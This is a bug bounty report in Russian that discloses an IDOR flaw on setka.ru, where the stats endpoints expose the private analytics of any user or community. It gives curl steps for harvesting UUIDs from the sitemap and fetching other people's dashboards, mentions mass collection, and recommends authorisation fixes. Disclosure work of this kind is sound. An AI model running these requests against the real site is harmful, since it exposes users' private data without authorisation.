# Report 07: IDOR — статистика чужих пользователей и сообществ

---
**Поля формы:**

- **Название:** IDOR — доступ к приватной аналитике любого пользователя и сообщества
- **Уровень опасности:** Средний
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **CVE:** (не указывать)
- **Скоуп:** setka.ru

---

## Где обнаружено

- `GET https://setka.ru/users/{user_id}/stats/total`
- `GET https://setka.ru/users/{user_id}/stats/views`
- `GET https://setka.ru/communities/{community_id}/stats/total`
- `GET https://setka.ru/communities/{community_id}/stats/views`

## Описание уязвимости

Endpoints `/users/{id}/stats/*` и `/communities/{id}/stats/*` позволяют аутентифицированному пользователю просматривать **приватные аналитические дашборды** любого другого пользователя или сообщества. Достаточно подставить чужой UUID в URL.

Данные (70-89KB каждый запрос) содержат:
- Графики просмотров (по дням/неделям)
- Топ-контент по views
- Данные подписчиков и активности
- Engagement метрики

## Шаги воспроизведения

### 1. Получение чужого UUID

```bash
curl -b "X_Bug_Bounty=security_standoff" \
  "https://setka.ru/users/sitemap-1.xml" -o users.xml
```
→ 15,000+ user UUIDs

### 2. Доступ к чужой статистике пользователя

```bash
curl -b "sess=MY_SESSION; X_Bug_Bounty=security_standoff" \
  "https://setka.ru/users/{VICTIM_UUID}/stats/total"
```
→ `200 OK`, 69KB — Chart.js dashboard с полной статистикой

```bash
curl -b "sess=MY_SESSION; X_Bug_Bounty=security_standoff" \
  "https://setka.ru/users/{VICTIM_UUID}/stats/views"
```
→ `200 OK`, 89KB

### 3. Доступ к чужой статистике сообщества

```bash
curl -b "sess=MY_SESSION; X_Bug_Bounty=security_standoff" \
  "https://setka.ru/communities/{COMMUNITY_ID}/stats/total"
```
→ `200 OK`, 70KB

## Влияние на безопасность

1. **Конкурентная разведка:** Доступ к метрикам конкурентов — просмотры, активность, рост.
2. **Бизнес-аналитика:** Маркетинговые стратегии и популярность контента конкурентов.
3. **Массовый сбор:** С sitemap (15K users, 3K communities) — статистика всей платформы.

**Рекомендации:** Проверка что `user_id` совпадает с аутентифицированным пользователем, для сообществ — только админам, middleware авторизации.

## Дополнительные ссылки

- CWE-639: https://cwe.mitre.org/data/definitions/639.html
- OWASP IDOR: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
